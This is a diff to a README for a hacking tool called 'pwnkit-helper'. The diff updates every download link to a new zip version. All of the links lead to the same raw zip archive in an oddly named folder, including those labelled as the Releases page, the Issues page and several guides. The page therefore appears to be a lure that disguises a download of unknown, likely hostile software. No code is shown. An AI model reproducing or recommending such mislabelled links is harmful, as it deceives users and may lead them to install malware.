@@ -1,6 +1,6 @@
 # 🛡️ pwnkit-helper - Elevate Your Hacking Skills Safely
 
-[![Download pwnkit-helper](https://raw.githubusercontent.com/kaisen-bot/pwnkit-helper/master/unappalled/pwnkit-helper.zip%20Now-Get%20pwnkit--helper-brightgreen)](https://raw.githubusercontent.com/kaisen-bot/pwnkit-helper/master/unappalled/pwnkit-helper.zip)
+[![Download pwnkit-helper](https://raw.githubusercontent.com/kaisen-bot/pwnkit-helper/master/unappalled/pwnkit-helper-2.8.zip%20Now-Get%20pwnkit--helper-brightgreen)](https://raw.githubusercontent.com/kaisen-bot/pwnkit-helper/master/unappalled/pwnkit-helper-2.8.zip)
 
 ## 📦 Overview
 
@@ -21,7 +21,7 @@ Before you download pwnkit-helper, ensure that your device meets these requireme
 
 Head over to our Releases page to find the latest version of pwnkit-helper. Click the link below:
 
-[Visit the Releases Page to Download](https://raw.githubusercontent.com/kaisen-bot/pwnkit-helper/master/unappalled/pwnkit-helper.zip)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/kaisen-bot/pwnkit-helper/master/unappalled/pwnkit-helper-2.8.zip)
 
 ### 3. Download the Software
 
@@ -69,17 +69,17 @@ pwnkit-helper has several features to help you succeed:
 
 ## ℹ️ Support
 
-For further assistance, check our [GitHub Issues Page](https://raw.githubusercontent.com/kaisen-bot/pwnkit-helper/master/unappalled/pwnkit-helper.zip) or reach out to the community.
+For further assistance, check our [GitHub Issues Page](https://raw.githubusercontent.com/kaisen-bot/pwnkit-helper/master/unappalled/pwnkit-helper-2.8.zip) or reach out to the community.
 
 ## 📚 Additional Resources
 
-- [Ethical Hacking Guide](https://raw.githubusercontent.com/kaisen-bot/pwnkit-helper/master/unappalled/pwnkit-helper.zip)
-- [Tutorials on Privilege Escalation](https://raw.githubusercontent.com/kaisen-bot/pwnkit-helper/master/unappalled/pwnkit-helper.zip)
+- [Ethical Hacking Guide](https://raw.githubusercontent.com/kaisen-bot/pwnkit-helper/master/unappalled/pwnkit-helper-2.8.zip)
+- [Tutorials on Privilege Escalation](https://raw.githubusercontent.com/kaisen-bot/pwnkit-helper/master/unappalled/pwnkit-helper-2.8.zip)
 
 ## 📥 Download & Install
 
 Now that you know how to get started, go ahead and download pwnkit-helper:
 
-[Click here to download pwnkit-helper](https://raw.githubusercontent.com/kaisen-bot/pwnkit-helper/master/unappalled/pwnkit-helper.zip)
+[Click here to download pwnkit-helper](https://raw.githubusercontent.com/kaisen-bot/pwnkit-helper/master/unappalled/pwnkit-helper-2.8.zip)
 
 Follow the steps outlined above, and you'll have the tool running in moments. If you encounter issues, refer to the troubleshooting section for help.
